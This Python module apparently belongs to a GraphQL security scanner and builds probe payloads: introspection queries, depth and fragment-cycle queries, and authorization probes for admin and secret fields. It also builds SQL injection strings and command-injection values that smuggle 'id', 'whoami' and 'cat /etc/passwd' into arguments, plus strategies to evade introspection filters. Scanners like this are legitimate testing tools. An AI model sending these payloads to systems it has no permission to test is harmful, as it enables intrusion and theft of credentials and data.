"""graphql: Payload generation."""
from __future__ import annotations

import json
import re
from typing import Any, Dict, List, Optional, Union

from argus.collectors.graphql.models import GraphQLMutationStrategy


class GraphQLPayloadGenerator:
    """Generates GraphQL probes across all vulnerability vectors and mutation strategies."""

    @staticmethod
    def build_baseline_query() -> str:
        """Builds a minimal benign query for baseline profiling."""
        return "query ArgusBaseline { __typename }"

    @staticmethod
    def build_introspection_query(full: bool = True) -> str:
        """Builds full schema introspection query."""
        if full:
            return """query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          name
          type { name kind }
        }
      }
    }
  }
}"""
        return """query RootIntrospection {
  __schema {
    queryType { name }
    mutationType { name }
  }
}"""

    @staticmethod
    def build_type_introspection_query(type_name: str = "Query") -> str:
        """Builds targeted single-type introspection query."""
        return f"""query TypeIntrospection {{
  __type(name: "{type_name}") {{
    name
    kind
    fields {{
      name
      type {{ name kind }}
    }}
  }}
}}"""

    @staticmethod
    def build_suggestion_probes() -> List[Dict[str, Any]]:
        """Builds misspelled field queries designed to trigger suggestion leakage."""
        return [
            {"name": "usr", "query": "query SuggestionProbeUsr { usr { id } }"},
            {"name": "passwrd", "query": "query SuggestionProbePass { passwrd }"},
            {"name": "adm", "query": "query SuggestionProbeAdm { adm { id } }"},
            {"name": "systm", "query": "query SuggestionProbeSystm { systm { info } }"},
            {"name": "accnt", "query": "query SuggestionProbeAccnt { accnt { id } }"},
            {"name": "tkn", "query": "query SuggestionProbeTkn { tkn }"},
        ]

    @staticmethod
    def build_depth_query(
        depth: int = 5,
        root_field: str = "user",
        nested_field: str = "friend",
        leaf_field: str = "id",
    ) -> str:
        """Builds dynamically nested recursive query of arbitrary depth."""
        inner = leaf_field
        for _ in range(max(1, depth - 1)):
            inner = f"{nested_field} {{ {inner} }}"
        return f"query DepthProbe{depth} {{ {root_field} {{ {inner} }} }}"

    @staticmethod
    def build_fragment_cycle_query() -> str:
        """Builds circular fragment reference query."""
        return "query FragmentCycleProbe { ...F1 } fragment F1 on Query { ...F1 }"

    @staticmethod
    def build_nested_fragment_query() -> str:
        """Builds nested circular fragment chain query."""
        return """query NestedFragmentCycle {
  ...F1
}
fragment F1 on Query {
  ...F2
}
fragment F2 on Query {
  ...F1
}"""

    @staticmethod
    def build_batch_array_payload(
        queries: Optional[List[str]] = None,
        count: int = 3,
    ) -> List[Dict[str, Any]]:
        """Builds a JSON array batch containing multiple query operations."""
        if not queries:
            queries = [f"query BatchOp{i} {{ __typename }}" for i in range(count)]
        return [{"query": q} for q in queries]

    @staticmethod
    def build_alias_multiplexing_query(
        alias_count: int = 20,
        field_name: str = "__typename",
    ) -> str:
        """Builds an alias multiplexing query containing N aliased fields."""
        aliases = " ".join([f"a{i}: {field_name}" for i in range(1, alias_count + 1)])
        return f"query AliasMultiplexingProbe {{ {aliases} }}"

    @staticmethod
    def build_field_authorization_probes() -> List[Dict[str, Any]]:
        """Builds probes for privileged/administrative fields."""
        return [
            {
                "field": "admin",
                "query": "query AdminAuthProbe { admin { id username email role permissions } }",
            },
            {
                "field": "users",
                "query": "query UsersAuthProbe { users { id username email passwordHash token } }",
            },
            {
                "field": "debug",
                "query": "query DebugAuthProbe { debug { systemInfo environment config secrets } }",
            },
            {
                "field": "tokens",
                "query": "query TokenAuthProbe { tokens { id secret token key } }",
            },
            {
                "field": "systemConfig",
                "query": "query ConfigAuthProbe { systemConfig { databaseUrl apiKey secretKey } }",
            },
        ]

    @staticmethod
    def build_sqli_probes() -> List[Dict[str, Any]]:
        """Builds SQL injection probes via GraphQL arguments."""
        return [
            {
                "name": "sqli_or",
                "query": 'query SQLiProbeOr { user(id: "1\' OR \'1\'=\'1--") { id username } }',
                "payload": "1' OR '1'='1--",
            },
            {
                "name": "sqli_union",
                "query": 'query SQLiProbeUnion { search(query: "1\' UNION SELECT null, null, null--") { results } }',
                "payload": "1' UNION SELECT null, null, null--",
            },
            {
                "name": "sqli_comment",
                "query": 'query SQLiProbeComment { node(id: "1\' OR 1=1 #") { id } }',
                "payload": "1' OR 1=1 #",
            },
        ]

    @staticmethod
    def build_cmdi_probes() -> List[Dict[str, Any]]:
        """Builds OS command injection probes via GraphQL arguments."""
        return [
            {
                "name": "cmdi_id",
                "query": 'query CmdIProbeId { system(cmd: "; id ;") { output } }',
                "payload": "; id ;",
            },
            {
                "name": "cmdi_whoami",
                "query": 'query CmdIProbeWhoami { export(format: "pdf; whoami") { result } }',
                "payload": "pdf; whoami",
            },
            {
                "name": "cmdi_cat_passwd",
                "query": 'query CmdIProbePasswd { ping(host: "127.0.0.1 | cat /etc/passwd") { status } }',
                "payload": "127.0.0.1 | cat /etc/passwd",
            },
        ]

    @classmethod
    def mutate_payload(
        cls,
        query: str,
        strategy: Union[GraphQLMutationStrategy, str],
        variables: Optional[Dict[str, Any]] = None,
        operation_name: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Applies a mutation/bypass strategy to a GraphQL query.

        Returns a structured dictionary specifying HTTP method, headers, params,
        JSON body, raw body data, and metadata.
        """
        strat = (
            strategy.value
            if isinstance(strategy, GraphQLMutationStrategy)
            else str(strategy).lower()
        )

        # Base request configuration
        req: Dict[str, Any] = {
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "params": None,
            "json": {
                "query": query,
                "variables": variables or {},
            },
            "data": None,
            "strategy": strat,
            "query": query,
            "variables": variables or {},
        }
        if operation_name:
            req["json"]["operationName"] = operation_name

        if strat == GraphQLMutationStrategy.STANDARD.value:
            return req

        elif strat == GraphQLMutationStrategy.METHOD_SWAPPING.value:
            # Convert to GET with query string parameter
            params: Dict[str, Any] = {"query": query}
            if variables:
                params["variables"] = json.dumps(variables)
            if operation_name:
                params["operationName"] = operation_name
            req["method"] = "GET"
            req["params"] = params
            req["json"] = None
            req["headers"] = {}
            return req

        elif strat == GraphQLMutationStrategy.CONTENT_TYPE_MANIPULATION.value:
            # Send raw query string with application/graphql header
            req["method"] = "POST"
            req["headers"] = {"Content-Type": "application/graphql"}
            req["json"] = None
            req["data"] = query
            return req

        elif strat == GraphQLMutationStrategy.QUERY_OBFUSCATION.value:
            # Obfuscate query by injecting comments, commas, and newlines
            obfuscated = re.sub(r"[ \t]+", ", ", query)
            obfuscated = obfuscated.replace("{", "# argus_guard\n{\n")
            obfuscated = obfuscated.replace("}", "\n# argus_end\n}")
            req["json"]["query"] = obfuscated
            req["query"] = obfuscated
            return req

        elif strat == GraphQLMutationStrategy.ALIAS_POLLUTION.value:
            # Inject alias renaming on introspection keywords
            polluted = query
            polluted = re.sub(r"\b__schema\b", "_argus_schema: __schema", polluted)
            polluted = re.sub(r"\btypes\b", "_argus_types: types", polluted)
            polluted = re.sub(r"\bqueryType\b", "_argus_qt: queryType", polluted)
            polluted = re.sub(r"\bmutationType\b", "_argus_mt: mutationType", polluted)
            polluted = re.sub(r"\b__type\b", "_argus_type: __type", polluted)
            req["json"]["query"] = polluted
            req["query"] = polluted
            return req

        elif strat == GraphQLMutationStrategy.VARIABLE_EXTRACTION.value:
            # Extract literal arguments into operation variables
            extracted_query = query
            extracted_vars = dict(variables or {})
            # Look for double-quoted strings inside arguments
            matches = list(re.finditer(r'([a-zA-Z0-9_]+)\s*:\s*"([^"]+)"', query))
            if matches:
                var_defs = []
                for i, m in enumerate(matches, 1):
                    arg_name = m.group(1)
                    val = m.group(2)
                    var_name = f"argus_{arg_name}_{i}"
                    extracted_vars[var_name] = val
                    var_defs.append(f"${var_name}: String")
                    extracted_query = extracted_query.replace(
                        m.group(0), f"{arg_name}: ${var_name}", 1
                    )
                # Prefix query with variable definitions if not already declared
                if "query " in extracted_query:
                    extracted_query = re.sub(
                        r"query\s*([a-zA-Z0-9_]*)\s*\{",
                        f"query \\1({', '.join(var_defs)}) {{",
                        extracted_query,
                        count=1,
                    )
                else:
                    extracted_query = f"query ({', '.join(var_defs)}) {extracted_query}"
            req["json"]["query"] = extracted_query
            req["json"]["variables"] = extracted_vars
            req["query"] = extracted_query
            req["variables"] = extracted_vars
            return req

        elif strat == GraphQLMutationStrategy.DIRECTIVE_BYPASS.value:
            # Wrap schema fields in @include(if: true) / @skip(if: false)
            directive_query = query
            directive_query = re.sub(
                r"\b__schema\b", "__schema @include(if: true)", directive_query
            )
            directive_query = re.sub(
                r"\btypes\b", "types @skip(if: false)", directive_query
            )
            directive_query = re.sub(
                r"\b__type\b", "__type @include(if: true)", directive_query
            )
            req["json"]["query"] = directive_query
            req["query"] = directive_query
            return req

        return req
